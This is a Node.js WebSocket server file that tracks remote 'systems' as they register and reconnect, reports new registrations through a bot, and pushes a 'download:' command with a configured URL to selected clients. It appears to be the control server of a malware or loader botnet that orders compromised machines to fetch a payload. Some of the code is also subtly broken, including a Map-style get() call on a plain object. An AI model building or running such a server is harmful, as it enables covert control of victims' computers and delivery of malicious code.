const WebSocket = require("ws");
const fs = require("fs").promises;
const path = require("path");
const { notifyLOG } = require("./bot.js");
const config = require("./config.json");

const SYSTEMS_FILE = path.join(__dirname, "systems.json");
const PORT = 3010;
const PATH = "/ws";

const clients = new Map(); 
let systems = {};




async function loadSystems() {
  try {
    const data = await fs.readFile(SYSTEMS_FILE, "utf8");
    systems = JSON.parse(data);
  } catch (err) {
    if (err.code === "ENOENT") {
      systems = {};
    } else {
      console.error("[!] Failed to load systems.json:", err.message);
      systems = {};
    }
  }
}

async function saveSystems() {
  try {
    await fs.writeFile(
      SYSTEMS_FILE,
      JSON.stringify(systems, null, 2),
      "utf8"
    );
  } catch (err) {
    console.error("[!] Failed to save systems.json:", err.message);
  }
}

loadSystems().then(() => {
  console.log(`[*] Loaded ${Object.keys(systems).length} systems`);
});

const wss = new WebSocket.Server({ port: PORT, path: PATH });

console.log(`[*] WebSocket server running on ws://localhost:${PORT}${PATH}`);

const HEARTBEAT_INTERVAL = 35_000;
const HEARTBEAT_TIMEOUT  = 45_000;  

setInterval(() => {
  const now = Date.now();
  for (const [username, ws] of clients.entries()) {
    if (now - ws.lastPongTime > HEARTBEAT_TIMEOUT) {
      console.log(`[✗] Heartbeat timeout → killing ${username}`);
      ws.terminate();
      cleanupClient(username, "heartbeat_timeout");
      continue;
    }
    ws.isAlive = false;
    ws.ping();
  }
}, HEARTBEAT_INTERVAL);

wss.on("connection", (ws, req) => {
  console.log("[+] New client connected");
  
  let username = null;
  ws.isAlive = true;

  // Heartbeat handlers
  ws.on("pong", () => {
    ws.isAlive = true;
  });

  ws.on("message", async (message) => {
    try {
      const data = JSON.parse(message.toString());

      if (!data?.type) return;

      switch (data.type) {
case "register": {
  const candidate = (data.username ?? "").trim();

  if (!candidate || candidate.length < 3 || candidate.length > 64) {
    ws.send(JSON.stringify({ error: "invalid_username" }));
    ws.close(1008, "Username length must be 3–64 characters");
    return;
  }
  if (clients.has(candidate) && clients.get(candidate) !== ws) {
    ws.send(JSON.stringify({ error: "username_already_connected" }));
    ws.close(1008, "Username already in use");
    return;
  }

          const newUsername = data.username.trim();

          // Prevent username takeover
          if (clients.has(newUsername) && clients.get(newUsername) !== ws) {
            ws.send(JSON.stringify({ error: "username_already_connected" }));
            ws.close(1008, "Username already in use");
            return;
          }

          username = newUsername;
          clients.set(username, ws);

          const now = Date.now();

          if (!systems[username]) {
            systems[username] = {
              uuid: data.uuid || "unknown",
              starttime: data.starttime || now,
              active: true,
              firstSeen: now,
              lastSeen: now
            };
            console.log(`[+] New system registered: ${username}`);
            notifyLOG?.(`❗️ New system registered → ${username}`);
          } else {
            systems[username].active = true;
            systems[username].lastSeen = now;
            console.log(`[+] System reconnected: ${username}`);
          }

          await saveSystems();
          break;
        }

        case "ping": {
          if (!username || !systems[username]) return;
          
          systems[username].active = true;
          systems[username].lastSeen = Date.now();

          break;
        }

        default:
          console.debug(`[?] Unknown message type: ${data.type}`);
      }
    } catch (err) {
      console.warn("[!] Invalid message:", err.message);
      // ws.send(JSON.stringify({ error: "invalid_message_format" })); // optional
    }
  });

  ws.on("close", async (code, reason) => {
    if (username && clients.get(username) === ws) {
      clients.delete(username);

      if (systems[username]) {
        systems[username].active = false;
        systems[username].lastSeen = Date.now();
        await saveSystems();
      }

      console.log(
        `[-] ${username} disconnected ` +
        `(code: ${code}${reason ? ` - ${reason}` : ""})`
      );
    }
  });

  ws.on("error", (err) => {
    console.error(`[!] WebSocket error${username ? ` (${username})` : ""}:`, err.message);
  });
});


async function sendDownload(username) {
  const ws = clients.get(username);
  
  if (!ws) {
    console.warn(`[!] sendDownload: ${username} not connected`);
    return false;
  }

  if (ws.readyState !== WebSocket.OPEN) {
    console.warn(`[!] sendDownload: ${username} websocket not OPEN (state: ${ws.readyState})`);
    return false;
  }

  try {
    ws.send(`download:${config.downloadUrl}`);
    console.log(`[>] Sent download command to ${username}`);
    return true;
  } catch (err) {
    console.error(`[!] Failed to send download to ${username}:`, err.message);
    return false;
  }
}


function cleanupClient(username, reason = "unknown") {
  clients.delete(username);
  const system = systems.get(username);
  if (system) {
    system.active = false;
    system.lastSeen = Date.now();
    system.disconnectReason = reason;  // optional but very helpful for debugging
  }
  console.log(`[-] Cleaned up ${username} (${reason})`);
  saveSystems();   // you can debounce this in production
}

module.exports = {
  clients,
  systems,
  sendDownload
};








